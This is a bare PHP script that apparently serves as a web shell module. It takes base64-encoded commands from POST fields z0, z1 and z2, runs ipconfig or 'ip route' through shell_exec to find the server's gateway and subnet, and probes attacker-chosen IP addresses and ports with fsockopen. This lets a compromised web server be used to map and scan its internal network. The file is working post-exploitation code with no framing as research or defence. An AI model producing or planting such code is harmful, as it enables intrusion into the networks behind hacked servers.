<?php

error_reporting(0);
set_time_limit(5);

$win = (FALSE !== strpos(strtolower(PHP_OS), 'win'));

function get_network_info() : array {
    global $win;
    $gateway = ''; $current_ip = '';
    if ($win) {
        $output = shell_exec('ipconfig');
        if (preg_match_all('/IPv4 Address[\s\.:]+([0-9\.]+).*?Default Gateway[\s\.:]+([0-9\.]+)/s', $output, $matches)) {
            foreach ($matches[2] as $index => $gw) {
                $gw = trim($gw);
                if (!empty($gw) && $gw !== '0.0.0.0') {
                    $gateway = $gw; $current_ip = trim($matches[1][$index]);
                    break;
                }
            }
        }
    } else {
        $gw_output = shell_exec("ip route show | grep default");
        if (preg_match('/default via ([0-9\.]+)/', $gw_output, $match)) $gateway = trim($match[1]);
        if (!empty($gateway)) {
            $ip_output = shell_exec("ip route get " . $gateway);
            if (preg_match('/src ([0-9\.]+)/', $ip_output, $match)) $current_ip = trim($match[1]);
        }
    }
    if (empty($gateway)) $gateway = '192.168.1.1';
    if (empty($current_ip)) $current_ip = '192.168.1.100';
    return ['gateway' => $gateway, 'ip' => $current_ip];
}

$action = base64_decode($_POST['z0']);

switch ($action) {
    case 'info':
        $net = get_network_info();
        $parts = explode('.', $net['ip']);
        array_pop($parts);
        $subnet = implode('.', $parts);
        
        echo json_encode([
            'status' => 'success',
            //'ip' => $net['ip'],
            'subnet' => $subnet
        ]);
        break;

    case 'check':
        $target_ip = base64_decode($_POST['z1']);
        $target_port = base64_decode($_POST['z2']);
        
        if (empty($target_ip) || $target_port <= 0) {
            echo json_encode(['open' => false]);
            break;
        }

        $sock = @fsockopen($target_ip, $target_port, $errno, $errstr, 1.5);
        if ($sock) {
            @fclose($sock);
            echo json_encode(['open' => true, 'ip' => $target_ip, 'port' => $target_port]);
        } else {
            echo json_encode(['open' => false]);
        }
        break;
}

?>